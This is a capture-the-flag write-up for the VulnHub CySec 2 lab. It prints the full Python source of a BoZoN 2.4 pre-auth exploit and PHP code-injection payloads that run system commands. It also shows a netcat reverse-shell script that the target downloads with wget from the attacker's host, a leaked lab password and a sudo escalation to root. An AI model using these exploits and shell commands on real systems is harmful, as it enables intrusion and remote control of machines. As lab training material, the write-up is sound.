---
title: CySec:2 - Writeup
author: Elman Alizadeh
date: 2022-05-24 17:55:00 +0800
categories: [ctf, VulnHub]
tags: [vulnhub, cysec]
---

Today we will take a look at Vulnhub: CySec 2. My goal in sharing this writeup is to show you the way if you are in trouble. Please try to understand each step and take notes.

![Desktop View]({{ "/assets/img/vuln-cysec-2/1.png" | relative_url }})

## Network scan

Command: sudo nmap -p- -sV -sC -oN nmap/open -- open 192.168.0.115

```console
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b1:00:57:62:be:65:42:f0:ba:3e:c1:47:c5:8d:fb:db (RSA)
|   256 5a:9b:20:89:19:c3:ab:d4:be:06:84:de:e4:30:d4:37 (ECDSA)
|_  256 08:4b:f3:f8:88:7e:1a:6b:e1:8d:7f:14:60:10:7a:98 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.41 (Ubuntu)
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|_    HY000
```

## Web

When we look at the source of the page, we see a sentence in encrypted form. Let’s decode it with CyberChef.

view-source:http://192.168.0.115/

```console
Zm9yIGZpcnN0IGZsYWcgY2hlY2sgL2NoYWxsZW5nZS9pbmRleC5waHAKZm9yIHNlY29uZCBmbGFnIGNoZWNrIC9FeG9saXQvaW5kZXgucGhw
```

[CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base64%28%27A-Za-z0-9%2B/%3D%27,true%29&input=Wm05eUlHWnBjbk4wSUdac1lXY2dZMmhsWTJzZ0wyTm9ZV3hzWlc1blpTOXBibVJsZUM1d2FIQUtabTl5SUhObFkyOXVaQ0JtYkdGbklHTm9aV05ySUM5RmVHOXNhWFF2YVc1a1pYZ3VjR2h3)

```console
for first flag check /challenge/index.php
for second flag check /Exolit/index.php
```

When we look at /Exolit/index.php, we see that BoZon is version 2.4. After searching, we found the exploit.

[BoZoN_2.4_exploit](https://www.exploit-db.com/exploits/41084)

## Exploit

```console
import urllib,urllib2,time

#Bozon v2.4 (bozon.pw/en/) Pre-Auth Remote Exploit
#Discovery / credits: John Page - Hyp3rlinx/Apparition
#hyp3rlinx.altervista.org
#Exploit: add user account | run phpinfo() command
#=========================================================

EXPLOIT=0
IP=raw_input("[Bozon IP]>")
EXPLOIT=int(raw_input("[Exploit Selection]> [1] Add User 'Apparition', [2] Execute phpinfo()"))

if EXPLOIT==1:
    CMD="Apparition"
else:
    CMD='"];$PWN=''phpinfo();//''//"'

if EXPLOIT != 0:
   url = 'http://'+IP+'/Exolit/index.php'
   data = urllib.urlencode({'creation' : '1', 'login' : CMD, 'pass' : 'abc123', 'confirm' : 'abc123', 'token' : ''})
   req = urllib2.Request(url, data)
   
response = urllib2.urlopen(req)
if EXPLOIT==1:
    print 'Apparition user account created! password: abc123'
else:
    print "Done!... waiting for phpinfo"
    time.sleep(0.5)
    print response.read()
```

If we launch the operation, we must first register. So let’s select 1, create a user and log in

```console
└─$ python2 exploit.py
[Bozon IP]>192.168.0.115
[Exploit Selection]> [1] Add User 'Apparition', [2] Execute phpinfo()1
Apparition user account created! password: abc123
```

Let’s enter.

```console
username: Apparition

password: abc123
```

When we refresh the page after selecting the second operation, we encounter such a page.

![Desktop View]({{ "/assets/img/vuln-cysec-2/2.png" | relative_url }})

This is the command that does this.

```console
CMD='"];$PWN=''phpinfo();//''//"'
```

Let’s use it.

[WebShells](https://www.acunetix.com/blog/articles/web-shells-101-using-php-introduction-web-shells-part-2/)

```console
CMD='"];system("ls -la");//''//"'
```

After changing this section, restart exploit and select the 2nd one. Then refresh the page.

The code has been executed

![Desktop View]({{ "/assets/img/vuln-cysec-2/3.png" | relative_url }})

“You can contact me if you have any questions.”

## Reverse shell

Let’s prepare such a useful load called reverse.sh

```console
#!/bin/bash 

nc -e /bin/sh YourİP 1234
```

Now let’s load it on the other side

Local machine

Command: python3 -m http.server 80

In exploit

```console
CMD='"];system("wget http://YourIP/reverse.sh");//''//"'

CMD='"];system("bash reverse.sh");//''//"'
```

Local machine
```console
nc -nvlp 1234
```
After listening, let’s refresh the page and get the shell.

![Desktop View]({{ "/assets/img/vuln-cysec-2/4.png" | relative_url }})

## CySec2

If we look at the flag.txt file, we can find the password for cysec2.

Command: cat flag.txt

```console
username = cysec2 
password =  $^WAhuy457i6kj
```

Command: su cysec2

## Root

Check privileges

Command: sudo -l

```console
(ALL : ALL) ALL
```

Command: sudo su

![Desktop View]({{ "/assets/img/vuln-cysec-2/5.png" | relative_url }})

### And now we are the root

![Desktop View]({{ "/assets/img/vuln-cysec-2/1.gif" | relative_url }})

“If you have any questions or comments, please do not hesitate to write. Have a good days”